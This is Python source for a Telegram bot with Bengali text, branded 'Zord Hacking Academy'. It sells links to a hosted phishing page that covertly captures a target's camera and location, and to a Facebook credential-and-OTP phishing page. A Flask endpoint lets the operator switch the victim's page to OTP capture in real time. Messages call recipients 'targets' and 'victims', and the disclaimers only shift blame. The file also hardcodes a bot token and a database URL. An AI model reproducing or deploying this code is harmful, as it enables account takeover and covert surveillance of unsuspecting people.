import telebot
from telebot import types
import requests
import time
from flask import Flask, jsonify
from flask_cors import CORS
from threading import Thread
import os
import random
import string

# --- সেটিংস ---
BOT_TOKEN = "8403844691:AAEF9pkqMm2G6e_t9FtjaLyg9v9erf-XMKs"
ADMIN_ID = 7068444019
ADMIN_USERNAME = "bcdatp10" 
CHANNEL_ID = "@hackingacademyX"
FIREBASE_URL = "https://bot-user-deta-default-rtdb.asia-southeast1.firebasedatabase.app/"
BASE_URL = "https://myw4371-a11y.github.io/Camh4ck/"

bot = telebot.TeleBot(BOT_TOKEN)
user_commands = {} 
temp_admin_data = {} # অ্যাডমিন ইনপুটের জন্য সাময়িক স্টোরেজ

# --- রেন্ডার ও CORS সার্ভার (OTP পেজ কানেকশনের জন্য) ---
app = Flask('')
CORS(app)

@app.route('/')
def home(): return "Zord Hacking Bot is Online!"

@app.route('/get_command/<user_id>')
def get_command(user_id):
    status = user_commands.get(str(user_id), "loading")
    response = jsonify({"status": status})
    response.headers.add("Access-Control-Allow-Origin", "*")
    return response

def run(): app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 10000)))
def keep_alive(): Thread(target=run).start()

# --- ডেটাবেস ফাংশন ---
def get_user(user_id):
    res = requests.get(f"{FIREBASE_URL}/users/{user_id}.json")
    return res.json() or {"coins": 0, "diamonds": 0, "referral_count": 0, "status": "active"}

def save_user(user_id, data):
    requests.patch(f"{FIREBASE_URL}/users/{user_id}.json", json=data)

def is_subscribed(user_id):
    try:
        status = bot.get_chat_member(CHANNEL_ID, user_id).status
        return status in ['member', 'administrator', 'creator']
    except: return False

# --- মেনু ডিজাইন ---
def main_menu():
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    markup.row("🚀 Start", "💰 My Assets")
    markup.row("👥 Refer", "🔥 Access")
    markup.row("ℹ️ Info")
    return markup

# --- স্টার্ট হ্যান্ডলার ---
@bot.message_handler(commands=['start'])
def welcome(message):
    user_id = str(message.chat.id)
    if not is_subscribed(user_id):
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("চ্যানেলে জয়েন করুন 📢", url=f"https://t.me/hackingacademyX"))
        markup.add(types.InlineKeyboardButton("জয়েন করেছি ✅", callback_data="verify_join"))
        bot.send_message(user_id, "⚠️ **অ্যাক্সেস ডিনাইড (Access Denied)!**\n\nআমাদের হ্যাকিং নেটওয়ার্কে যুক্ত হতে আগে চ্যানেলে জয়েন করুন।", reply_markup=markup)
        return
    bot.send_message(user_id, "📡 **সিস্টেম অনলাইন...**\nZord Hacking Academy-তে আপনার সেশন শুরু হয়েছে।", reply_markup=main_menu())

# --- টেক্সট মেসেজ ও মেনু লজিক ---
@bot.message_handler(func=lambda m: True)
def handle_text(message):
    user_id = str(message.chat.id)
    if not is_subscribed(user_id):
        bot.send_message(user_id, "❌ আপনি চ্যানেল থেকে লিভ নিয়েছেন! পুনরায় জয়েন করুন। @hackingacademyX ")
        return

    text = message.text
    data = get_user(user_id)

    if text == "🚀 Start":
        bot.send_message(user_id, "🚀 কমান্ড গ্রহণ করার জন্য বোটটি প্রস্তুত।", reply_markup=main_menu())

    elif text == "💰 My Assets":
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("🛒 প্রিমিয়াম পারচেজ", url=f"https://t.me/{ADMIN_USERNAME}"),
                   types.InlineKeyboardButton("🎁 গিফট কোড রিডিম", callback_data="redeem_ui"))
        
        # অ্যাডমিনের জন্য স্পেশাল বাটন
        if message.chat.id == ADMIN_ID:
            markup.add(types.InlineKeyboardButton("⚙️ Create Redeem Code", callback_data="admin_gen_select"))
            
        bot.send_message(user_id, f"📊 **অ্যাকাউন্ট স্ট্যাটাস:**\n\n🪙 Coins: `{data.get('coins', 0)}` (ক্যামেরা টুলস)\n💎 Diamonds: `{data.get('diamonds', 0)}` (ফেসবুক টুলস)", reply_markup=markup, parse_mode='Markdown')

    elif text == "👥 Refer":
        bot_user = bot.get_me().username
        link = f"https://t.me/{bot_user}?start={user_id}"
        bot.send_message(user_id, f"👥 **রেফারাল প্রোগ্রাম:**\n\nসফল ভেরিফায়েড রেফারে আপনি পাবেন **৫০ কয়েন**।\n\n🔗 আপনার ইনভাইট লিঙ্ক:\n`{link}`", parse_mode='Markdown')

    elif text == "🔥 Access":
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("📸 ক্যামেরা ও লোকেশন (10 Coin)", callback_data="buy_cam"),
                   types.InlineKeyboardButton("🔐 ফেসবুক হ্যাক + OTP (5 Diamond)", callback_data="buy_fb"))
        bot.send_message(user_id, "🛠 **হ্যাকিং কনসোল:**\nকোন টুলসটি এক্সিকিউট করতে চান?", reply_markup=markup)

    elif text == "ℹ️ Info":
        ref_count = data.get('referral_count', 0)
        info_text = (
            "🏛 **Zord Hacking Academy - বোট প্রোফাইল**\n"
            "━━━━━━━━━━━━━━━━━━━━\n"
            "আমরা একটি আধুনিক সাইবার সিকিউরিটি ও সোশ্যাল ইঞ্জিনিয়ারিং প্ল্যাটফর্ম।\n\n"
            "🚀 **আমাদের বিশেষত্ব:**\n"
            "• রিয়েল-টাইম ওটিপি কন্ট্রোল সিস্টেম।\n"
            "• সائلেন্ট ক্যামেরা ক্যাপচারিং।\n"
            "• প্রিসাইজ লোকেশন ট্র্যাকিং।\n\n"
            "💵 **কয়েন বাড়ানোর গাইড:**\n"
            "১. **রেফার:** আপনার লিঙ্ক থেকে জয়েন করিয়ে কয়েন জমান।\n"
            "২. **চ্যানেল:** আমাদের চ্যানেলে নিয়মিত ফ্রি প্রোমো কোড দেওয়া হয়।\n"
            "৩. **বাই:** সরাসরি অ্যাডমিন থেকে কিনুন দ্রুত অ্যাক্সেসের জন্য।\n\n"
            f"👤 **আপনার ডাটা:**\n"
            f"সফল রেফার: {ref_count} জন\n"
            "━━━━━━━━━━━━━━━━━━━━\n"
            "⚠️ **সতর্কবার্তা:**\n"
            "এই বোটের অপব্যবহার আইনত দণ্ডনীয়। কোনো অনৈতিক কাজের জন্য 'Zord Academy' দায়ী থাকবে না।"
        )
        bot.send_message(user_id, info_text, parse_mode='Markdown')

# --- কলব্যাক হ্যান্ডলার ও লিঙ্ক জেনারেশন ---
@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
    user_id = str(call.message.chat.id)
    data = get_user(user_id)

    # --- অ্যাডমিন রিডিম কোড জেনারেশন ---
    if call.data == "admin_gen_select":
        if int(user_id) != ADMIN_ID: return
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("🪙 Coin Code", callback_data="set_type_coins"),
                   types.InlineKeyboardButton("💎 Diamond Code", callback_data="set_type_diamonds"))
        bot.send_message(ADMIN_ID, "🛠 **অ্যাডমিন প্যানেল:**\nকোন কারেন্সির কোড বানাতে চান?", reply_markup=markup)

    elif call.data.startswith("set_type_"):
        asset_type = call.data.split("_")[2]
        temp_admin_data[ADMIN_ID] = {"type": asset_type}
        msg = bot.send_message(ADMIN_ID, f"✅ আপনি **{asset_type}** সিলেক্ট করেছেন।\nএখন রিডিম কোডটি কী হবে তা লিখুন:")
        bot.register_next_step_handler(msg, admin_get_code)

    elif call.data == "redeem_ui":
        msg = bot.send_message(user_id, "📩 আপনার রিডিম কোডটি এখানে টাইপ করুন:")
        bot.register_next_step_handler(msg, process_redeem_user)

    # ক্যামেরা ও লোকেশন লিঙ্ক জেনারেশন
    elif call.data == "buy_cam":
        if data.get('coins', 0) >= 10:
            data['coins'] -= 10
            save_user(user_id, data)
            link = f"{BASE_URL}?id={user_id}&exp={int(time.time())+3600}"
            
            msg = (
                f"✅ **ক্যামেরা ও লোকেশন লিঙ্ক জেনারেট হয়েছে!**\n\n"
                f"🔗 লিঙ্ক: `{link}`\n"
                f"⏰ মেয়াদ: ১ ঘণ্টা।\n\n"
                f"⚠️ **সতর্কতা:** টার্গেটকে লিঙ্কটি পাঠানোর সময় সচেতন থাকুন। লিঙ্কের অপব্যবহারের কারণে আইনি সমস্যা হলে তার দায়ভার আপনার নিজের।"
            )
            bot.send_message(user_id, msg, parse_mode='Markdown')
        else: bot.answer_callback_query(call.id, "❌ যথেষ্ট কয়েন নেই! রেফার করুন।", show_alert=True)

    # ফেসবুক হ্যাকিং লিঙ্ক জেনারেশন
    elif call.data == "buy_fb":
        if data.get('diamonds', 0) >= 5:
            data['diamonds'] -= 5
            save_user(user_id, data)
            user_commands[user_id] = "loading"
            link = f"{BASE_URL}fb/?id={user_id}&exp={int(time.time())+3600}"
            
            msg = (
                f"✅ **ফেসবুক হ্যাকিং লিঙ্ক জেনারেট হয়েছে!**\n\n"
                f"🔗 লিঙ্ক: `{link}`\n"
                f"⏰ মেয়াদ: ১ ঘণ্টা।\n\n"
                f"⚠️ **সতর্কতা:** ভিকটিমের ব্যক্তিগত তথ্যের নিরাপত্তা নিশ্চিত করা ইউজারের দায়িত্ব। কোনো অবৈধ কাজের জন্য অ্যাডমিন দায়ী নয়।"
            )
            bot.send_message(user_id, msg, parse_mode='Markdown')
        else: bot.answer_callback_query(call.id, "❌ ডায়মন্ড নেই! অ্যাডমিনের সাথে যোগাযোগ করুন।", show_alert=True)

    # ওটিপি কন্ট্রোল
    elif call.data.startswith("open_otp_"):
        target_id = call.data.split("_")[2]
        user_commands[str(target_id)] = "show_otp"
        bot.answer_callback_query(call.id, "✅ ওটিপি পেজ পাঠানো হয়েছে!", show_alert=True)

    # ভেরিফাই জয়েন
    elif call.data == "verify_join":
        if is_subscribed(user_id):
            bot.delete_message(user_id, call.message.message_id)
            bot.send_message(user_id, "✅ সিস্টেম ভেরিফিকেশন সফল! আপনার অ্যাকাউন্ট এখন সচল।", reply_markup=main_menu())
        else: bot.answer_callback_query(call.id, "❌ আগে জয়েন করুন!", show_alert=True)

# --- অ্যাডমিন প্রসেস ফাংশনসমূহ ---
def admin_get_code(message):
    temp_admin_data[ADMIN_ID]["code"] = message.text.strip()
    msg = bot.send_message(ADMIN_ID, "✅ কোড সেট হয়েছে।\nএখন এই কোডে কত **Amount** থাকবে তা লিখুন:")
    bot.register_next_step_handler(msg, admin_get_amount)

def admin_get_amount(message):
    if not message.text.isdigit():
        msg = bot.send_message(ADMIN_ID, "❌ শুধু সংখ্যা লিখুন। কত পরিমাণ দিতে চান?")
        bot.register_next_step_handler(msg, admin_get_amount)
        return
    temp_admin_data[ADMIN_ID]["amount"] = int(message.text)
    msg = bot.send_message(ADMIN_ID, "✅ পরিমাণ সেট হয়েছে।\nসর্বশেষ, এই কোডটি **কতজন** ব্যবহার করতে পারবে?")
    bot.register_next_step_handler(msg, admin_get_limit)

def admin_get_limit(message):
    if not message.text.isdigit():
        msg = bot.send_message(ADMIN_ID, "❌ শুধু সংখ্যা লিখুন। কতজন ব্যবহার করতে পারবে?")
        bot.register_next_step_handler(msg, admin_get_limit)
        return
    
    limit = int(message.text)
    admin_data = temp_admin_data[ADMIN_ID]
    
    promo_data = {
        "type": admin_data["type"],
        "amount": admin_data["amount"],
        "limit": limit,
        "used_count": 0,
        "used_by": {}
    }
    
    requests.put(f"{FIREBASE_URL}/promo_codes/{admin_data['code']}.json", json=promo_data)
    bot.send_message(ADMIN_ID, f"🎉 **সফলভাবে কোড তৈরি হয়েছে!**\n\n🎫 কোড: `{admin_data['code']}`\n💰 টাইপ: {admin_data['type']}\n💵 পরিমাণ: {admin_data['amount']}\n👥 লিমিট: {limit} জন")

# --- ইউজার রিডিম প্রসেস ---
def process_redeem_user(message):
    user_id = str(message.chat.id)
    code_input = message.text.strip()
    
    res = requests.get(f"{FIREBASE_URL}/promo_codes/{code_input}.json").json()

    if res:
        if user_id in res.get("used_by", {}):
            bot.send_message(user_id, "❌ আপনি এই কোডটি একবার ব্যবহার করেছেন!")
            return
        if res["used_count"] >= res["limit"]:
            bot.send_message(user_id, "❌ এই কোডের ব্যবহারের সীমা শেষ!")
            return
        
        # ব্যালেন্স আপডেট
        u_data = get_user(user_id)
        u_data[res["type"]] += res["amount"]
        save_user(user_id, u_data)
        
        # স্ট্যাটাস আপডেট
        res["used_count"] += 1
        if "used_by" not in res: res["used_by"] = {}
        res["used_by"][user_id] = True
        requests.put(f"{FIREBASE_URL}/promo_codes/{code_input}.json", json=res)
        
        bot.send_message(user_id, f"🎉 অভিনন্দন! আপনি সফলভাবে {res['amount']} {res['type']} পেয়েছেন।")
    else:
        bot.send_message(user_id, "❌ ভুল রিডিম কোড!")

if __name__ == "__main__":
    keep_alive()
    bot.infinity_polling()
